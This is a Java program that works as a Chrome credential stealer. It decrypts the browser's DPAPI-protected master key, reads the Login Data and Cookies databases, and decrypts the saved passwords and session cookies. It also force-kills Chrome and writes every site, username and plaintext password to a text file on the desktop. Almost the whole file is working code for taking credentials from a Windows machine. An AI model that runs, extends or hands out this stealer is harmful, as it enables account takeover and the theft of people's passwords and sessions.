import java.io.BufferedWriter;
import java.io.File;
import java.io.FileOutputStream;

import java.io.IOException;
import java.io.OutputStreamWriter;
import java.nio.charset.StandardCharsets;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.PreparedStatement;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.util.Base64;

import javax.crypto.Cipher;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;

import com.sun.jna.platform.win32.Crypt32Util;

import java.nio.file.Files;
import java.nio.file.Paths;
import org.json.JSONObject;

public class ChromeDecryptor {

    // 獲取 Chrome 加密密鑰
    public static byte[] getEncryptionKey() throws Exception {
        
        String localStatePath = System.getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Local State";
        String json = new String(Files.readAllBytes(Paths.get(localStatePath)), StandardCharsets.UTF_8);
        JSONObject jsonObject = new JSONObject(json);
        String encryptedKeyBase64 = jsonObject.getJSONObject("os_crypt").getString("encrypted_key");
        
        byte[] encryptedKey = Base64.getDecoder().decode(encryptedKeyBase64);
        encryptedKey = java.util.Arrays.copyOfRange(encryptedKey, 5, encryptedKey.length); // 移除前 5 個字節
        return Crypt32Util.cryptUnprotectData(encryptedKey); // 使用 Windows DPAPI 解密
    }

    // 解密 AES-GCM 加密的 Cookie/密碼
    public static String decryptData(byte[] encryptedData, byte[] key) throws Exception {
        if (encryptedData.length < 15) {
            return "無法解密";
        }
        byte[] iv = java.util.Arrays.copyOfRange(encryptedData, 3, 15); // AES-GCM IV
        byte[] cipherText = java.util.Arrays.copyOfRange(encryptedData, 15, encryptedData.length);

        Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
        SecretKeySpec secretKeySpec = new SecretKeySpec(key, "AES");
        GCMParameterSpec parameterSpec = new GCMParameterSpec(128, iv);
        cipher.init(Cipher.DECRYPT_MODE, secretKeySpec, parameterSpec);

        return new String(cipher.doFinal(cipherText), StandardCharsets.UTF_8);
    }

    // 讀取 Chrome 密碼資料庫
    public static void fetchPasswords() {
        try {
            byte[] key = getEncryptionKey();
            String dbPath = System.getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Default\\Login Data";
            File dbFile = new File(dbPath);

            if (!dbFile.exists()) {
                System.out.println("Chrome 密碼資料庫不存在！");
                return;
            }

            Connection connection = DriverManager.getConnection("jdbc:sqlite:" + dbPath);
            String query = "SELECT origin_url, username_value, password_value FROM logins";
            PreparedStatement statement = connection.prepareStatement(query);
            ResultSet resultSet = statement.executeQuery();
            fileSummerizer(resultSet, key);

            

            resultSet.close();
            statement.close();
            connection.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    // 讀取 Chrome Cookie
    public static void fetchCookies() {
        try {
            byte[] key = getEncryptionKey();
            String dbPath = System.getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Default\\Network\\Cookies";
            File dbFile = new File(dbPath);

            if (!dbFile.exists()) {
                System.out.println("Chrome Cookie 資料庫不存在！");
                return;
            }

            Connection connection = DriverManager.getConnection("jdbc:sqlite:" + dbPath);
            String query = "SELECT host_key, name, encrypted_value FROM cookies";
            PreparedStatement statement = connection.prepareStatement(query);
            ResultSet resultSet = statement.executeQuery();

            while (resultSet.next()) {
                String domain = resultSet.getString("host_key");
                String cookieName = resultSet.getString("name");
                byte[] encryptedValue = resultSet.getBytes("encrypted_value");

                String decryptedValue = decryptData(encryptedValue, key);
                System.out.println("網站: " + domain + ", Cookie 名稱: " + cookieName + ", Cookie 值: " + decryptedValue);
            }

            resultSet.close();
            statement.close();
            connection.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    //建立檔案
    public static void fileSummerizer(ResultSet resultSet, byte[] key ) throws SQLException, Exception{
        String userhome = System.getProperty("user.home");
        System.out.println(userhome);
        String desktop = userhome+ File.separator + "Desktop";
        File example = new File(desktop,"allData3.txt");
         try (BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(new FileOutputStream(example), StandardCharsets.UTF_8))) {
            while (resultSet.next()) {
                String url = resultSet.getString("origin_url");
                String username = resultSet.getString("username_value");
                byte[] encryptedPassword = resultSet.getBytes("password_value");

                String decryptedPassword = decryptData(encryptedPassword, key);
                writer.write("網站: " + url + ", 使用者: " + username + ", 密碼: " + decryptedPassword+"\n");
            }
            
            System.out.println("文件已成功建立：" + example.getAbsolutePath());
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
    //強制關閉chrome
    public static void shutDownApp(String app){
        try {
            Runtime.getRuntime().exec("taskkill /F /IM " + app + ".exe");
            System.out.println("Chrome 已關閉");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    // 主方法
    public static void main(String[] args) {
        shutDownApp("chrome");
        System.out.println("讀取 Chrome 密碼");
        fetchPasswords();
        
       
    }
}
